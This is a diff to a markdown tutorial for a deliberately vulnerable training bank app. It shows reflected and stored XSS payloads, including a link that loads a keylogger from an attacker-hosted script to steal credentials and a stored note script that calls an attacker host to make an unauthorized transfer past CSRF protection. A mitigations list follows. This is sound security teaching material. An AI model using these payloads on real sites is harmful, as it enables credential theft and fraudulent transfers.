@@ -33,33 +33,40 @@ Therefore it is mostly susceptible to source based XSS vulnerabilities.
   * *error* : `<div ...>${error}</div>`
   * *info* : `<div ...>${info}</div>` 
   * *message* : `<div ...>${message}</div>`
+  * Test it: 
+    1. You should get an alert pop-up with '1' displayed as the javascript in the request parameter executes: http://vbank.127.0.0.1.xip.io:8080/login?info=%3Cscript%3Ealert(1)%3C/script%3E 
 * *transfer.jsp* and *BankController.doTransfer(...)* save the transfer details without validation/etc. and *history.jsp* displays them w/o escaping
+  * Test it:
+    1. Go to the transfer page and make a transfer to any valid account (i.e. 2-123456-22) with the note '<script>alert(2)</script>'
+    1. Then visit the history page where you should get an alert pop-up with '1' displayed as the javascript entered in the note filed executes.
 
 ## Exploit to understand
-1. Test reflected XSS in login page. You should get an alert pop-up with '1' displayed as the javascript in the request parameter executes: http://vbank.0.0.0.0.xip.io:8080/login?info=%3Cscript%3Ealert(1)%3C/script%3E 
 1. Exploit stored XSS in login page:
-   * As Alice send Bob the login link with installs a keylogger by exploiting the vulnerability: 
-     http://vbank.0.0.0.0.xip.io:8080/login?info=%3Cscript%20src=%22http://attack.0.0.0.0.xip.io:9090/js/keylog.js%22%3E%3C/script%3E 
-   * the keylogger send each keystroke to the attack app, the logged keystrokes you can see at http://attack.0.0.0.0.xip.io:9090/viewlog (do not let the browser autofil the form! ...because there are no keystrokes then)
-   * This way Alice can steal Bob's login credentials. Even though the keylogger and the log viewer app are by far no perfect
-1. Test stored XSS 
-   * go to the transfer page and make a transfer to any valid account (i.e. 2-123456-22) with the note '<script>alert(2)</script>'
-   * then go to the history page where you should get an alert pop-up with '1' displayed as the javascript entered in the note filed executes.
+   * as Alice send Bob the login link which installs a keylogger by exploiting the reflected XSS vulnerability: 
+     http://vbank.127.0.0.1.xip.io:8080/login?info=%3Cscript%20src=%22http://attack.127.0.0.1.xip.io:9090/js/keylog.js%22%3E%3C/script%3E 
+   * the keylogger sends each keystroke to the log service running in the attacker app, the logged keystrokes you can see at http://attack.127.0.0.1.xip.io:9090/viewlog\
+     (Do not let the browser autofil the form! ...because there are no keystrokes then)
+   * this way Alice can steal Bob's login credentials. Even though the keylogger and the log viewer app are by far no perfect
 1. Exploit stored XSS
-   * as Alice (alice / h1alice) you know Bob's account number (1-123456-11) and you will transfer him a little amount with the note including a malicious javascript posting a transfer (and overcoming CSRF protection by including the token)
-     * The attack script is at http://attack.0.0.0.0.xip.io:9090/js/attack.js; use the method *transfer(formname, fromAccount, toAccount, amount, currency, action)* in the note. 
-     * For example: `<script src="http://attack.0.0.0.0.xip.io:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","1000","CHF")</script>`
-      * Please transfer 1 CHF to Bob's account with the above note.
-   * As Bob logs in and reviews his transactions the malicious script included in Alice's transfer executes and transfers Alice a larger amount without Bob's consent.
-     * login as Bob (bob / h3ll0bob) and go to the history page (by clickin on the account number) 
-     * the malicious javascript (XSS) should be loaded from the database and executed
-     * if you refresh the page you sould see the transaction
+   * log in as Alice (alice / h1alice) and trasnfer Bob a little amount with the note including a malicious javascript posting a transfer (and overcoming CSRF protection by including the token)
+     * Bob's account No is 1-123456-11
+     * The attack script is at http://attack.127.0.0.1.xip.io:9090/js/attack.js; this has a function *transfer(formname, fromAccount, toAccount, amount, currency, action)* 
+     * Use this in the note field: `<script src="http://attack.127.0.0.1.xip.io:9090/js/attack.js"></script><script>transfer("fromBob1","1-123456-11","3-123456-33","1000","CHF")</script>`
+     * Please transfer 1 CHF to Bob's account with the above script in the note.
+   * as Bob logs in and reviews his transactions the malicious script included in Alice's transfer executes and transfers Alice a larger amount without Bob's consent.
+     * login as Bob (bob / h3ll0bob) and go to the transaction history page (by clickin on the account number); 
+     * the malicious script you have just saved in the note field of the transaction as Alice is loaded from the database and executed in the browser;
+     * if you refresh the page you sould see the transaction. Acrtually; the script should execute every time the transaction history page is loaded for Bob.
   
 ## Mitigations:
   * validate input
-  * encode text input (i.e. with HTML encoding)
-  * sanitize text/HTML input (remove potentially dangerous char sequences) if validation and encoding is not enough or possible (i.e. rich text HTML)
-  * escape output (replace control characters with their encoded counterparts that are not interpreted as controls/commands by the HTML parser and can be displayed)
+    * set up validation rules (such as data size/length, format, possible values) for the transaction fields of accountNo, amount, currency
+  * encode text input (i.e. with HTML encoding) 
+    * on the transaction form this applies to the _note_ field
+  * sanitize text/HTML input (remove potentially dangerous char sequences) 
+    * only if validation and encoding are not possible (i.e. rich text HTML)
+    * well, the transaction form has no such field
+  * escape output; it replaces control characters with their encoded counterparts that are not interpreted as controls/commands by the HTML parser and can be displayed (i.e. < will be converted to &gt;)
   * use Secure-Content-Policy headers to control which scripts the browser can execute (this needs to be supported by the browser as well)
 
 ## Fix
